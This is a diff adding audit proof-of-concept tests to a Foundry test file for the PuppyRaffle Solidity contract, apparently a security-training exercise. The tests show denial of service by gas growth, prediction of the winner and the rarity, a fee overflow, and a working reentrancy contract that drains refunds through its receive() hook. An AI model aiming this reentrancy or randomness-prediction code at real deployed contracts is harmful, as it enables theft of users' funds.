@@ -2,7 +2,7 @@
 pragma solidity ^0.7.6;
 pragma experimental ABIEncoderV2;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console2} from "forge-std/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
 
 contract PuppyRaffleTest is Test {
@@ -16,11 +16,7 @@ contract PuppyRaffleTest is Test {
     uint256 duration = 1 days;
 
     function setUp() public {
-        puppyRaffle = new PuppyRaffle(
-            entranceFee,
-            feeAddress,
-            duration
-        );
+        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
     }
 
     //////////////////////
@@ -212,5 +208,168 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    /*//////////////////////////////////////////////////////////////
+                                 AUDIT
+    //////////////////////////////////////////////////////////////*/
+    function test_denialOfService() public {
+        // address[] memory players = new address[](1);
+        // players[0] = playerOne;
+        // puppyRaffle.enterRaffle{value: entranceFee}(players);
+        // assertEq(puppyRaffle.players(0), playerOne);
+
+        vm.txGasPrice(1);
+
+        // We enter our first 100 players
+        uint256 numPlayers = 100;
+        address[] memory players = new address[](numPlayers);
+        for (uint256 i = 0; i < numPlayers; i++) {
+            players[i] = address(i);
+        }
+
+        // We calculate the gas spent
+        uint256 gasStart = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
+        uint256 gasEnd = gasleft();
+
+        uint256 gasSpentOne = gasStart - gasEnd;
+        console2.log("Gas spent for the first 100 players: ", gasSpentOne);
+
+        // Next 100 players
+        address[] memory playersTwo = new address[](numPlayers);
+        for (uint256 i = 0; i < numPlayers; i++) {
+            playersTwo[i] = address(i + numPlayers);
+        }
+
+        // We calculate the gas spent
+        gasStart = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(playersTwo);
+        gasEnd = gasleft();
+
+        uint256 gasSpentTwo = gasStart - gasEnd;
+        console2.log("Gas spent for the second 100 players: ", gasSpentTwo);
+
+        assert(gasSpentOne < gasSpentTwo);
+    }
+
+    function test_notRandomWinnerIndex() public playersEntered {
+        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());
+
+        // `playersEntered` enters 4 users, so players.length is hardcoded here
+        // `address(this)` instead of `msg.sender` to match that input with the call to `puppyRaffle.selectWinner()`
+        uint256 expectedIndexWinner = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
+        address expectedWinner = puppyRaffle.players(expectedIndexWinner);
+
+        puppyRaffle.selectWinner();
+
+        address realWinner = puppyRaffle.previousWinner();
+        console2.log("The expected winner is    : ", expectedWinner);
+        console2.log("The real winner is        : ", realWinner);
+        if (expectedWinner == realWinner) console2.log("Expected winner == real winner");
+        assertEq(expectedWinner, realWinner, "winner was not predictable");
+    }
+
+    function test_notRandomRarity() public playersEntered {
+        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());
+
+        // Reproduce the on-chain calc: `address(this)` is the msg.sender of selectWinner()
+        uint256 rarity = uint256(keccak256(abi.encodePacked(address(this), block.difficulty))) % 100;
+        uint256 expectedRarity;
+        if (rarity <= puppyRaffle.COMMON_RARITY()) {
+            expectedRarity = puppyRaffle.COMMON_RARITY();
+        } else if (rarity <= puppyRaffle.COMMON_RARITY() + puppyRaffle.RARE_RARITY()) {
+            expectedRarity = puppyRaffle.RARE_RARITY();
+        } else {
+            expectedRarity = puppyRaffle.LEGENDARY_RARITY();
+        }
+
+        uint256 tokenId = puppyRaffle.totalSupply(); // 0 for the first mint
+
+        puppyRaffle.selectWinner();
+
+        uint256 actualRarity = puppyRaffle.tokenIdToRarity(tokenId);
+        console2.log("Expected rarity : ", expectedRarity);
+        console2.log("Actual rarity   : ", actualRarity);
+        if (expectedRarity == actualRarity) console2.log("Expected rarity == actual rarity");
+        assertEq(actualRarity, expectedRarity, "rarity was not predictable");
+    }
+
+    function test_feeOverflow() public {
+        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());
+
+        uint256 numPlayers = 95;
+        address[] memory players = new address[](numPlayers);
+        for (uint256 i = 0; i < numPlayers; i++) {
+            players[i] = address(i + 1_000_000);
+        }
+
+        // Manual calculation in uin256
+        uint256 expectedTotalAmountCollected = players.length * entranceFee;
+        uint256 expectedFee = (expectedTotalAmountCollected * 20) / 100;
+        uint256 expectedTotalFees = expectedFee;
+        
+        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
+        puppyRaffle.selectWinner();
+
+        // Real result in uint64
+        uint64 realTotalFees = puppyRaffle.totalFees();
+
+        console2.log("The expected total fees are    : ", expectedTotalFees);
+        console2.log("The real total fees are        : ", uint256(realTotalFees));
+        assertLt(uint256(realTotalFees), expectedTotalFees, "Real total fees isn't minor than expected one");
+    }
+
+    function test_reentrancyRefund() public playersEntered {
+        ReentrancyContract attackContract = new ReentrancyContract(puppyRaffle);
+        vm.deal(address(attackContract), 1 ether);
+
+        uint256 initialAttackerBalance = address(attackContract).balance;
+        uint256 initialVictimBalance = address(puppyRaffle).balance;
+        console2.log("=== INITIAL STATE ===");
+        console2.log("Initial attacker balance  : ", initialAttackerBalance);
+        console2.log("Initial victim balance    : ", initialVictimBalance);
+
+        attackContract.startAttack();
+
+        uint256 finalAttackerBalance = address(attackContract).balance;
+        uint256 finalVictimBalance = address(puppyRaffle).balance;
+        console2.log("=== FINAL STATE ===");
+        console2.log("Final attacker balance    : ", finalAttackerBalance);
+        console2.log("Final victim balance      : ", finalVictimBalance);
+
+        if(initialAttackerBalance < finalAttackerBalance) {
+            console2.log("Reentrancy was successful!");
+        } else {
+            console2.log("Reentrancy failed");
+        }
+    }
+}
+
+// This goes outside the PuppyRaffleTest contract
+contract ReentrancyContract {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function startAttack() external {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    receive() external payable {
+        if(address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
     }
 }
